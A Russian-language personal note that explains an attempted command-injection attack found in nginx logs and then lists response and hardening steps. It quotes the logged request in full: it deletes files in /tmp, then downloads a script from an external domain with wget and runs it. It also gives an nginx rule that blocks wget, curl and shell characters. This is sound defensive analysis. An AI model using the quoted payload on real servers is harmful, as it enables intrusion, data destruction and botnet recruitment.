# Атаки на nginx

#### Попытка выполнить команды через URL

В логах [[Nginx]]:

```
GET /shell?cd+/tmp;rm+-rf+*;wget+scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1
```

#### Что пытается сделать злоумышленник?

1. **`cd /tmp`**
    - Переходит во временную директорию `/tmp`, где обычно есть права на запись.

2. **`rm -rf *`**
    - **Удаляет все файлы** в `/tmp` (возможно, чтобы скрыть следы предыдущих атак).
        
3. **`wget scamanje.stresserit.pro/jaws`**
    - Скачивает вредоносный файл `jaws` с подозрительного домена `scamanje.stresserit.pro`.
        
4. **`sh /tmp/jaws`**
    - Запускает скачанный скрипт, который, скорее всего:
        - Устанавливает бэкдор.
        - Ворует данные.
        - Превращает сервер в часть ботнета.

###### **Признаки атаки**

- **Подозрительный URL**: `/shell?` (явно указывает на попытку RCE — выполнения команд на сервере).
- **Использование `wget` + `sh`**: классическая схема загрузки и запуска вредоносного ПО.
- **Домен `stresserit.pro`**: похож на сервисы для DDoS-атак (например, Stresser IP Booter).

###### **Что делать срочно?**

1) Заблокируйте IP злоумышленника

в [[Nginx]]:

```
location / {
    deny 94.25.187.245;  # Подставьте реальный IP из лога
    allow all;
}
```

Через `iptables` (если Linux):

```bash
iptables -A INPUT -s 94.25.187.245 -j DROP
```

2) Проверьте сервер на взлом

Найдите подозрительные файлы в `/tmp`:

```bash
ls -la /tmp/jaws
```

В идеале вывод такой: `ls: cannot access '/tmp/jaws': No such file or directory`

Проверьте запущенные процессы:

```bash
ps aux | grep jaws
```

В идеале вывод примерно такой: `root 202856 0.0 0.2 6480 2284 pts/0 S+ 13:18 0:00 grep --color=auto jaws` (это означает, что в списке процессов обнаружен только сам grep, ищущий jaws.)

Ищите неожиданные cron-задачи:

```
crontab -l
grep -r "scamanje.stresserit.pro" /etc/
```

В идеале вывод такой: `no crontab for root`
Вторая команда ничего не выводит.

Дополнительно:

Проверить историю команд
```bash
history | grep -E 'wget|curl|sh|bash|jaws'
```


Проверить недавно измененные файлы
```bash
find / -type f -mtime -7 -ls | head -50
```

Проверить сетевые соединения
```bash
netstat -tulnp
ss -tulnp
```

Проверить автозагрузку
```bash
systemctl list-units --type=service --state=running
ls -la /etc/systemd/system/
```

3) Удалите вредоносные файлы

Если найдёте `jaws` или подобное:

```bash
rm -f /tmp/jaws
killall jaws  # Если процесс запущен
```

4) Обновите Nginx и софт

Убедитесь, что нет уязвимостей:

```bash
sudo apt update && sudo apt upgrade nginx
```


###### **Как предотвратить повторные атаки?**

1) Запретите выполнение команд через URL

В Nginx:

```
if ($request_uri ~* "(;|\||\`|>|<|&|wget|curl|sh|bash|python|perl)") {
    return 403;
}
```

2) Ограничьте доступ к `/tmp` и другим критичным папкам

В Nginx:

```
location ~ ^/(tmp|etc|var|root) {
    deny all;
}
```

3) Включите логирование всех подозрительных запросов

В Nginx:

```
location / {
    access_log /var/log/nginx/suspicious.log combined;
}
```

### **Вывод**

- **Это явная попытка взлома** через уязвимость в веб-приложении или Nginx.
- **Срочно проверьте сервер** на наличие бэкдоров.
- **Закройте уязвимости**: обновите софт, настройте WAF, запретите опасные символы в URL.

Если атака уже успешна — рассмотрите **полное восстановление сервера из бэкапа** (после проверки на вирусы).

#hack #attack